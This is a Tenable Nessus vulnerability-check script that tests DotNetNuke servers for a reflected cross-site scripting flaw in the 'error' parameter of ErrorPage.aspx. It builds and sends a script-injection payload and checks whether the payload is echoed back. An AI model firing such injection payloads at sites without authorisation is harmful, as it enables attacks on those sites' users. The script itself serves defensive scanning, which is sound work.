#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(38928);
  script_version("$Revision: 1.2 $");
  
  script_bugtraq_id(35074);
  script_xref(name:"Secunia", value:"35178");

  script_name(english:"DotNetNuke ErrorPage.aspx Cross-Site Scripting");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that is
affected by a cross-site scripting vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running DotNetNuke, a web application framework
written in ASP.NET.

The installed version of DotNetNuke fails to properly sanitize user
supplied input to the 'error' parameter of the 'ErrorPage.aspx' script
before using it to generate dynamic HTML output.  An attacker can
exploit this flaw to launch cross-site scripting attacks against the
affected site." );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/503723/30/0/threaded" );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?566413fa" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to DotNetNuke 4.9.4 or later." );
  script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );

  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_asp(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# Loop through the directories
if (thorough_tests) dirs = list_uniq(make_list("/dotnetnuke", cgi_dirs()));
else dirs = make_list(cgi_dirs());

exploit = string('<script>alert("', SCRIPT_NAME, '")</script>');

foreach dir (dirs)
{
  url = string(
    dir, "/ErrorPage.aspx?",
    "status=500&",
    "error=", urlencode(str:exploit)
  );

  res = http_send_recv3(method:'GET', item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if it's DotNetNuke
  # and we see the exploit in the result
  if (
    'DotNetNuke Error' >< res[2] &&
    string("<p>", exploit, "</p>") >< res[2]
  )
  {
    set_kb_item('www/'+port+'/XSS', value:TRUE);

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port:port);

    exit(0);
  }
}
